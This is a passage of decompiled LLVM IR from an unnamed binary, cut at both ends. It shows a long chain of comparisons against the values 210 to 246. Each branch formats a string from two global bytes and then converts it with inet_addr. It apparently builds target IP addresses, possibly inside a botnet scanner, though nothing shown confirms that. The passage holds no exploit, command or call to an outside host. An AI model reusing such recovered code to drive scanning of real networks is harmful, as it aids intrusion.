  %v8_da94 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f258.508 to i32), i32 %v4_da94, i32 %v6_da94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %dec_label_pc_da64, %dec_label_pc_da70
  %v7_da9c = icmp eq i32 %v2_ad74, 210
  br i1 %v7_da9c, label %dec_label_pc_daa4, label %dec_label_pc_dacc

dec_label_pc_daa4:                                ; preds = %dec_label_pc_da98
  %v3_dab0 = load i8, i8* @global_var_29925.87, align 1
  %v3_dabc = load i8, i8* @global_var_29926.88, align 1
  %v4_dac8 = sext i8 %v3_dab0 to i32
  %v6_dac8 = sext i8 %v3_dabc to i32
  %v8_dac8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f268.510 to i32), i32 %v4_dac8, i32 %v6_dac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_da98, %dec_label_pc_daa4
  %v7_dad0 = icmp eq i32 %v2_ad74, 211
  br i1 %v7_dad0, label %dec_label_pc_dad8, label %dec_label_pc_db00

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dacc
  %v3_dae4 = load i8, i8* @global_var_29925.87, align 1
  %v3_daf0 = load i8, i8* @global_var_29926.88, align 1
  %v4_dafc = sext i8 %v3_dae4 to i32
  %v6_dafc = sext i8 %v3_daf0 to i32
  %v8_dafc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1f278.512 to i32), i32 %v4_dafc, i32 %v6_dafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_dacc, %dec_label_pc_dad8
  %v7_db04 = icmp eq i32 %v2_ad74, 212
  br i1 %v7_db04, label %dec_label_pc_db0c, label %dec_label_pc_db34

dec_label_pc_db0c:                                ; preds = %dec_label_pc_db00
  %v3_db18 = load i8, i8* @global_var_29925.87, align 1
  %v3_db24 = load i8, i8* @global_var_29926.88, align 1
  %v4_db30 = sext i8 %v3_db18 to i32
  %v6_db30 = sext i8 %v3_db24 to i32
  %v8_db30 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f284.514 to i32), i32 %v4_db30, i32 %v6_db30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_db34

dec_label_pc_db34:                                ; preds = %dec_label_pc_db00, %dec_label_pc_db0c
  %v7_db38 = icmp eq i32 %v2_ad74, 213
  br i1 %v7_db38, label %dec_label_pc_db40, label %dec_label_pc_db68

dec_label_pc_db40:                                ; preds = %dec_label_pc_db34
  %v3_db4c = load i8, i8* @global_var_29925.87, align 1
  %v3_db58 = load i8, i8* @global_var_29926.88, align 1
  %v4_db64 = sext i8 %v3_db4c to i32
  %v6_db64 = sext i8 %v3_db58 to i32
  %v8_db64 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f294.516 to i32), i32 %v4_db64, i32 %v6_db64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db34, %dec_label_pc_db40
  %v7_db6c = icmp eq i32 %v2_ad74, 214
  br i1 %v7_db6c, label %dec_label_pc_db74, label %dec_label_pc_db9c

dec_label_pc_db74:                                ; preds = %dec_label_pc_db68
  %v3_db80 = load i8, i8* @global_var_29925.87, align 1
  %v3_db8c = load i8, i8* @global_var_29926.88, align 1
  %v4_db98 = sext i8 %v3_db80 to i32
  %v6_db98 = sext i8 %v3_db8c to i32
  %v8_db98 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f2a4.518 to i32), i32 %v4_db98, i32 %v6_db98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_db9c

dec_label_pc_db9c:                                ; preds = %dec_label_pc_db68, %dec_label_pc_db74
  %v7_dba0 = icmp eq i32 %v2_ad74, 215
  br i1 %v7_dba0, label %dec_label_pc_dba8, label %dec_label_pc_dbd0

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db9c
  %v3_dbb4 = load i8, i8* @global_var_29925.87, align 1
  %v3_dbc0 = load i8, i8* @global_var_29926.88, align 1
  %v4_dbcc = sext i8 %v3_dbb4 to i32
  %v6_dbcc = sext i8 %v3_dbc0 to i32
  %v8_dbcc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f2b4.520 to i32), i32 %v4_dbcc, i32 %v6_dbcc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_db9c, %dec_label_pc_dba8
  %v7_dbd4 = icmp eq i32 %v2_ad74, 216
  br i1 %v7_dbd4, label %dec_label_pc_dbdc, label %dec_label_pc_dc04

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dbd0
  %v3_dbe8 = load i8, i8* @global_var_29925.87, align 1
  %v3_dbf4 = load i8, i8* @global_var_29926.88, align 1
  %v4_dc00 = sext i8 %v3_dbe8 to i32
  %v6_dc00 = sext i8 %v3_dbf4 to i32
  %v8_dc00 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f2c4.522 to i32), i32 %v4_dc00, i32 %v6_dc00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dc04

dec_label_pc_dc04:                                ; preds = %dec_label_pc_dbd0, %dec_label_pc_dbdc
  %v7_dc08 = icmp eq i32 %v2_ad74, 217
  br i1 %v7_dc08, label %dec_label_pc_dc10, label %dec_label_pc_dc38

dec_label_pc_dc10:                                ; preds = %dec_label_pc_dc04
  %v3_dc1c = load i8, i8* @global_var_29925.87, align 1
  %v3_dc28 = load i8, i8* @global_var_29926.88, align 1
  %v4_dc34 = sext i8 %v3_dc1c to i32
  %v6_dc34 = sext i8 %v3_dc28 to i32
  %v8_dc34 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f2d4.524 to i32), i32 %v4_dc34, i32 %v6_dc34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dc38

dec_label_pc_dc38:                                ; preds = %dec_label_pc_dc04, %dec_label_pc_dc10
  %v7_dc3c = icmp eq i32 %v2_ad74, 218
  br i1 %v7_dc3c, label %dec_label_pc_dc44, label %dec_label_pc_dc6c

dec_label_pc_dc44:                                ; preds = %dec_label_pc_dc38
  %v3_dc50 = load i8, i8* @global_var_29925.87, align 1
  %v3_dc5c = load i8, i8* @global_var_29926.88, align 1
  %v4_dc68 = sext i8 %v3_dc50 to i32
  %v6_dc68 = sext i8 %v3_dc5c to i32
  %v8_dc68 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f2e4.526 to i32), i32 %v4_dc68, i32 %v6_dc68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dc6c

dec_label_pc_dc6c:                                ; preds = %dec_label_pc_dc38, %dec_label_pc_dc44
  %v7_dc70 = icmp eq i32 %v2_ad74, 219
  br i1 %v7_dc70, label %dec_label_pc_dc78, label %dec_label_pc_dca0

dec_label_pc_dc78:                                ; preds = %dec_label_pc_dc6c
  %v3_dc84 = load i8, i8* @global_var_29925.87, align 1
  %v3_dc90 = load i8, i8* @global_var_29926.88, align 1
  %v4_dc9c = sext i8 %v3_dc84 to i32
  %v6_dc9c = sext i8 %v3_dc90 to i32
  %v8_dc9c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f2f4.528 to i32), i32 %v4_dc9c, i32 %v6_dc9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc6c, %dec_label_pc_dc78
  %v7_dca4 = icmp eq i32 %v2_ad74, 220
  br i1 %v7_dca4, label %dec_label_pc_dcac, label %dec_label_pc_dcd4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dca0
  %v3_dcb8 = load i8, i8* @global_var_29925.87, align 1
  %v3_dcc4 = load i8, i8* @global_var_29926.88, align 1
  %v4_dcd0 = sext i8 %v3_dcb8 to i32
  %v6_dcd0 = sext i8 %v3_dcc4 to i32
  %v8_dcd0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f304.530 to i32), i32 %v4_dcd0, i32 %v6_dcd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dcd4

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dca0, %dec_label_pc_dcac
  %v7_dcd8 = icmp eq i32 %v2_ad74, 221
  br i1 %v7_dcd8, label %dec_label_pc_dce0, label %dec_label_pc_dd08

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dcd4
  %v3_dcec = load i8, i8* @global_var_29925.87, align 1
  %v3_dcf8 = load i8, i8* @global_var_29926.88, align 1
  %v4_dd04 = sext i8 %v3_dcec to i32
  %v6_dd04 = sext i8 %v3_dcf8 to i32
  %v8_dd04 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f314.532 to i32), i32 %v4_dd04, i32 %v6_dd04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dce0
  %v7_dd0c = icmp eq i32 %v2_ad74, 222
  br i1 %v7_dd0c, label %dec_label_pc_dd14, label %dec_label_pc_dd3c

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dd08
  %v3_dd20 = load i8, i8* @global_var_29925.87, align 1
  %v3_dd2c = load i8, i8* @global_var_29926.88, align 1
  %v4_dd38 = sext i8 %v3_dd20 to i32
  %v6_dd38 = sext i8 %v3_dd2c to i32
  %v8_dd38 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f324.534 to i32), i32 %v4_dd38, i32 %v6_dd38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd08, %dec_label_pc_dd14
  %v7_dd40 = icmp eq i32 %v2_ad74, 223
  br i1 %v7_dd40, label %dec_label_pc_dd48, label %dec_label_pc_dd70

dec_label_pc_dd48:                                ; preds = %dec_label_pc_dd3c
  %v3_dd54 = load i8, i8* @global_var_29925.87, align 1
  %v3_dd60 = load i8, i8* @global_var_29926.88, align 1
  %v4_dd6c = sext i8 %v3_dd54 to i32
  %v6_dd6c = sext i8 %v3_dd60 to i32
  %v8_dd6c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f334.536 to i32), i32 %v4_dd6c, i32 %v6_dd6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd70

dec_label_pc_dd70:                                ; preds = %dec_label_pc_dd3c, %dec_label_pc_dd48
  %v7_dd74 = icmp eq i32 %v2_ad74, 224
  br i1 %v7_dd74, label %dec_label_pc_dd7c, label %dec_label_pc_dda4

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dd70
  %v3_dd88 = load i8, i8* @global_var_29925.87, align 1
  %v3_dd94 = load i8, i8* @global_var_29926.88, align 1
  %v4_dda0 = sext i8 %v3_dd88 to i32
  %v6_dda0 = sext i8 %v3_dd94 to i32
  %v8_dda0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f344.538 to i32), i32 %v4_dda0, i32 %v6_dda0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dda4

dec_label_pc_dda4:                                ; preds = %dec_label_pc_dd70, %dec_label_pc_dd7c
  %v7_dda8 = icmp eq i32 %v2_ad74, 225
  br i1 %v7_dda8, label %dec_label_pc_ddb0, label %dec_label_pc_ddd8

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dda4
  %v3_ddbc = load i8, i8* @global_var_29925.87, align 1
  %v3_ddc8 = load i8, i8* @global_var_29926.88, align 1
  %v4_ddd4 = sext i8 %v3_ddbc to i32
  %v6_ddd4 = sext i8 %v3_ddc8 to i32
  %v8_ddd4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f354.540 to i32), i32 %v4_ddd4, i32 %v6_ddd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_dda4, %dec_label_pc_ddb0
  %v7_dddc = icmp eq i32 %v2_ad74, 226
  br i1 %v7_dddc, label %dec_label_pc_dde4, label %dec_label_pc_de0c

dec_label_pc_dde4:                                ; preds = %dec_label_pc_ddd8
  %v3_ddf0 = load i8, i8* @global_var_29925.87, align 1
  %v3_ddfc = load i8, i8* @global_var_29926.88, align 1
  %v4_de08 = sext i8 %v3_ddf0 to i32
  %v6_de08 = sext i8 %v3_ddfc to i32
  %v8_de08 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f364.542 to i32), i32 %v4_de08, i32 %v6_de08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_ddd8, %dec_label_pc_dde4
  %v7_de10 = icmp eq i32 %v2_ad74, 227
  br i1 %v7_de10, label %dec_label_pc_de18, label %dec_label_pc_de40

dec_label_pc_de18:                                ; preds = %dec_label_pc_de0c
  %v3_de24 = load i8, i8* @global_var_29925.87, align 1
  %v3_de30 = load i8, i8* @global_var_29926.88, align 1
  %v4_de3c = sext i8 %v3_de24 to i32
  %v6_de3c = sext i8 %v3_de30 to i32
  %v8_de3c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f374.544 to i32), i32 %v4_de3c, i32 %v6_de3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %dec_label_pc_de0c, %dec_label_pc_de18
  %v7_de44 = icmp eq i32 %v2_ad74, 228
  br i1 %v7_de44, label %dec_label_pc_de4c, label %dec_label_pc_de74

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de40
  %v3_de58 = load i8, i8* @global_var_29925.87, align 1
  %v3_de64 = load i8, i8* @global_var_29926.88, align 1
  %v4_de70 = sext i8 %v3_de58 to i32
  %v6_de70 = sext i8 %v3_de64 to i32
  %v8_de70 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f384.546 to i32), i32 %v4_de70, i32 %v6_de70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de74

dec_label_pc_de74:                                ; preds = %dec_label_pc_de40, %dec_label_pc_de4c
  %v7_de78 = icmp eq i32 %v2_ad74, 229
  br i1 %v7_de78, label %dec_label_pc_de80, label %dec_label_pc_dea8

dec_label_pc_de80:                                ; preds = %dec_label_pc_de74
  %v3_de8c = load i8, i8* @global_var_29925.87, align 1
  %v3_de98 = load i8, i8* @global_var_29926.88, align 1
  %v4_dea4 = sext i8 %v3_de8c to i32
  %v6_dea4 = sext i8 %v3_de98 to i32
  %v8_dea4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f394.548 to i32), i32 %v4_dea4, i32 %v6_dea4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dea8

dec_label_pc_dea8:                                ; preds = %dec_label_pc_de74, %dec_label_pc_de80
  %v7_deac = icmp eq i32 %v2_ad74, 230
  br i1 %v7_deac, label %dec_label_pc_deb4, label %dec_label_pc_e060

dec_label_pc_deb4:                                ; preds = %dec_label_pc_dea8
  %v3_dec0 = load i8, i8* @global_var_29925.87, align 1
  %v3_decc = load i8, i8* @global_var_29926.88, align 1
  %v4_ded8 = sext i8 %v3_dec0 to i32
  %v6_ded8 = sext i8 %v3_decc to i32
  %v8_ded8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f3a4.550 to i32), i32 %v4_ded8, i32 %v6_ded8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e060

dec_label_pc_e060:                                ; preds = %dec_label_pc_dea8, %dec_label_pc_deb4
  %v7_e064 = icmp eq i32 %v2_ad74, 231
  br i1 %v7_e064, label %dec_label_pc_e06c, label %dec_label_pc_e094

dec_label_pc_e06c:                                ; preds = %dec_label_pc_e060
  %v3_e078 = load i8, i8* @global_var_29925.87, align 1
  %v3_e084 = load i8, i8* @global_var_29926.88, align 1
  %v4_e090 = sext i8 %v3_e078 to i32
  %v6_e090 = sext i8 %v3_e084 to i32
  %v8_e090 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f3b4.552 to i32), i32 %v4_e090, i32 %v6_e090, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e060, %dec_label_pc_e06c
  %v7_e098 = icmp eq i32 %v2_ad74, 232
  br i1 %v7_e098, label %dec_label_pc_e0a0, label %dec_label_pc_e0c8

dec_label_pc_e0a0:                                ; preds = %dec_label_pc_e094
  %v3_e0ac = load i8, i8* @global_var_29925.87, align 1
  %v3_e0b8 = load i8, i8* @global_var_29926.88, align 1
  %v4_e0c4 = sext i8 %v3_e0ac to i32
  %v6_e0c4 = sext i8 %v3_e0b8 to i32
  %v8_e0c4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f3c4.555 to i32), i32 %v4_e0c4, i32 %v6_e0c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e0c8

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e094, %dec_label_pc_e0a0
  %v7_e0cc = icmp eq i32 %v2_ad74, 233
  br i1 %v7_e0cc, label %dec_label_pc_e0d4, label %dec_label_pc_e0fc

dec_label_pc_e0d4:                                ; preds = %dec_label_pc_e0c8
  %v3_e0e0 = load i8, i8* @global_var_29925.87, align 1
  %v3_e0ec = load i8, i8* @global_var_29926.88, align 1
  %v4_e0f8 = sext i8 %v3_e0e0 to i32
  %v6_e0f8 = sext i8 %v3_e0ec to i32
  %v8_e0f8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f3d4.557 to i32), i32 %v4_e0f8, i32 %v6_e0f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e0fc

dec_label_pc_e0fc:                                ; preds = %dec_label_pc_e0c8, %dec_label_pc_e0d4
  %v7_e100 = icmp eq i32 %v2_ad74, 234
  br i1 %v7_e100, label %dec_label_pc_e108, label %dec_label_pc_e130

dec_label_pc_e108:                                ; preds = %dec_label_pc_e0fc
  %v3_e114 = load i8, i8* @global_var_29925.87, align 1
  %v3_e120 = load i8, i8* @global_var_29926.88, align 1
  %v4_e12c = sext i8 %v3_e114 to i32
  %v6_e12c = sext i8 %v3_e120 to i32
  %v8_e12c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f3e4.559 to i32), i32 %v4_e12c, i32 %v6_e12c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %dec_label_pc_e0fc, %dec_label_pc_e108
  %v7_e134 = icmp eq i32 %v2_ad74, 235
  br i1 %v7_e134, label %dec_label_pc_e13c, label %dec_label_pc_e164

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e130
  %v3_e148 = load i8, i8* @global_var_29925.87, align 1
  %v3_e154 = load i8, i8* @global_var_29926.88, align 1
  %v4_e160 = sext i8 %v3_e148 to i32
  %v6_e160 = sext i8 %v3_e154 to i32
  %v8_e160 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f3f4.561 to i32), i32 %v4_e160, i32 %v6_e160, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e164

dec_label_pc_e164:                                ; preds = %dec_label_pc_e130, %dec_label_pc_e13c
  %v7_e168 = icmp eq i32 %v2_ad74, 236
  br i1 %v7_e168, label %dec_label_pc_e170, label %dec_label_pc_e198

dec_label_pc_e170:                                ; preds = %dec_label_pc_e164
  %v3_e17c = load i8, i8* @global_var_29925.87, align 1
  %v3_e188 = load i8, i8* @global_var_29926.88, align 1
  %v4_e194 = sext i8 %v3_e17c to i32
  %v6_e194 = sext i8 %v3_e188 to i32
  %v8_e194 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f404.563 to i32), i32 %v4_e194, i32 %v6_e194, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e198

dec_label_pc_e198:                                ; preds = %dec_label_pc_e164, %dec_label_pc_e170
  %v7_e19c = icmp eq i32 %v2_ad74, 237
  br i1 %v7_e19c, label %dec_label_pc_e1a4, label %dec_label_pc_e1cc

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e198
  %v3_e1b0 = load i8, i8* @global_var_29925.87, align 1
  %v3_e1bc = load i8, i8* @global_var_29926.88, align 1
  %v4_e1c8 = sext i8 %v3_e1b0 to i32
  %v6_e1c8 = sext i8 %v3_e1bc to i32
  %v8_e1c8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f414.565 to i32), i32 %v4_e1c8, i32 %v6_e1c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e1cc

dec_label_pc_e1cc:                                ; preds = %dec_label_pc_e198, %dec_label_pc_e1a4
  %v7_e1d0 = icmp eq i32 %v2_ad74, 238
  br i1 %v7_e1d0, label %dec_label_pc_e1d8, label %dec_label_pc_e200

dec_label_pc_e1d8:                                ; preds = %dec_label_pc_e1cc
  %v3_e1e4 = load i8, i8* @global_var_29925.87, align 1
  %v3_e1f0 = load i8, i8* @global_var_29926.88, align 1
  %v4_e1fc = sext i8 %v3_e1e4 to i32
  %v6_e1fc = sext i8 %v3_e1f0 to i32
  %v8_e1fc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f424.567 to i32), i32 %v4_e1fc, i32 %v6_e1fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e1cc, %dec_label_pc_e1d8
  %v7_e204 = icmp eq i32 %v2_ad74, 239
  br i1 %v7_e204, label %dec_label_pc_e20c, label %dec_label_pc_e234

dec_label_pc_e20c:                                ; preds = %dec_label_pc_e200
  %v3_e218 = load i8, i8* @global_var_29925.87, align 1
  %v3_e224 = load i8, i8* @global_var_29926.88, align 1
  %v4_e230 = sext i8 %v3_e218 to i32
  %v6_e230 = sext i8 %v3_e224 to i32
  %v8_e230 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f434.569 to i32), i32 %v4_e230, i32 %v6_e230, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e234

dec_label_pc_e234:                                ; preds = %dec_label_pc_e200, %dec_label_pc_e20c
  %v7_e238 = icmp eq i32 %v2_ad74, 240
  br i1 %v7_e238, label %dec_label_pc_e240, label %dec_label_pc_e268

dec_label_pc_e240:                                ; preds = %dec_label_pc_e234
  %v3_e24c = load i8, i8* @global_var_29925.87, align 1
  %v3_e258 = load i8, i8* @global_var_29926.88, align 1
  %v4_e264 = sext i8 %v3_e24c to i32
  %v6_e264 = sext i8 %v3_e258 to i32
  %v8_e264 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f444.571 to i32), i32 %v4_e264, i32 %v6_e264, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %dec_label_pc_e234, %dec_label_pc_e240
  %v7_e26c = icmp eq i32 %v2_ad74, 241
  br i1 %v7_e26c, label %dec_label_pc_e274, label %dec_label_pc_e29c

dec_label_pc_e274:                                ; preds = %dec_label_pc_e268
  %v3_e280 = load i8, i8* @global_var_29925.87, align 1
  %v3_e28c = load i8, i8* @global_var_29926.88, align 1
  %v4_e298 = sext i8 %v3_e280 to i32
  %v6_e298 = sext i8 %v3_e28c to i32
  %v8_e298 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1f454.573 to i32), i32 %v4_e298, i32 %v6_e298, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e268, %dec_label_pc_e274
  %v7_e2a0 = icmp eq i32 %v2_ad74, 242
  br i1 %v7_e2a0, label %dec_label_pc_e2a8, label %dec_label_pc_e2d0

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e29c
  %v3_e2b4 = load i8, i8* @global_var_29925.87, align 1
  %v3_e2c0 = load i8, i8* @global_var_29926.88, align 1
  %v4_e2cc = sext i8 %v3_e2b4 to i32
  %v6_e2cc = sext i8 %v3_e2c0 to i32
  %v8_e2cc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f464.575 to i32), i32 %v4_e2cc, i32 %v6_e2cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e29c, %dec_label_pc_e2a8
  %v7_e2d4 = icmp eq i32 %v2_ad74, 243
  br i1 %v7_e2d4, label %dec_label_pc_e2dc, label %dec_label_pc_e304

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2d0
  %v3_e2e8 = load i8, i8* @global_var_29925.87, align 1
  %v3_e2f4 = load i8, i8* @global_var_29926.88, align 1
  %v4_e300 = sext i8 %v3_e2e8 to i32
  %v6_e300 = sext i8 %v3_e2f4 to i32
  %v8_e300 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f474.577 to i32), i32 %v4_e300, i32 %v6_e300, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e304

dec_label_pc_e304:                                ; preds = %dec_label_pc_e2d0, %dec_label_pc_e2dc
  %v7_e308 = icmp eq i32 %v2_ad74, 244
  br i1 %v7_e308, label %dec_label_pc_e310, label %dec_label_pc_e338

dec_label_pc_e310:                                ; preds = %dec_label_pc_e304
  %v3_e31c = load i8, i8* @global_var_29925.87, align 1
  %v3_e328 = load i8, i8* @global_var_29926.88, align 1
  %v4_e334 = sext i8 %v3_e31c to i32
  %v6_e334 = sext i8 %v3_e328 to i32
  %v8_e334 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f484.579 to i32), i32 %v4_e334, i32 %v6_e334, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e338

dec_label_pc_e338:                                ; preds = %dec_label_pc_e304, %dec_label_pc_e310
  %v7_e33c = icmp eq i32 %v2_ad74, 245
  br i1 %v7_e33c, label %dec_label_pc_e344, label %dec_label_pc_e36c

dec_label_pc_e344:                                ; preds = %dec_label_pc_e338
  %v3_e350 = load i8, i8* @global_var_29925.87, align 1
  %v3_e35c = load i8, i8* @global_var_29926.88, align 1
  %v4_e368 = sext i8 %v3_e350 to i32
  %v6_e368 = sext i8 %v3_e35c to i32
  %v8_e368 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f494.581 to i32), i32 %v4_e368, i32 %v6_e368, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e36c

dec_label_pc_e36c:                                ; preds = %dec_label_pc_e338, %dec_label_pc_e344
  %v7_e370 = icmp eq i32 %v2_ad74, 246
  br i1 %v7_e370, label %dec_label_pc_e378, label %dec_label_pc_e3a0

dec_label_pc_e378:                                ; preds = %dec_label_pc_e36c
  %v3_e384 = load i8, i8* @global_var_29925.87, align 1
  %v3_e390 = load i8, i8* @global_var_29926.88, align 1
  %v4_e39c = sext i8 %v3_e384 to i32
  %v6_e39c = sext i8 %v3_e390 to i32
  %v8_e39c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1f4a4.583 to i32), i32 %v4_e39c, i32 %v6_e39c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e36c, %dec_label_pc_e378
  store i32 %v2_aca0, i32* @r0, align 4
  %v1_e3dc = call i32 @inet_addr(i32 %v2_aca0)
  store i32 %v3_ac98, i32* @fp, align 4
  ret i32 %v1_e3dc

; uselistorder directives
  uselistorder i32 %v2_aca0, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 0, 176, 177, 178, 179, 180, 181, 182, 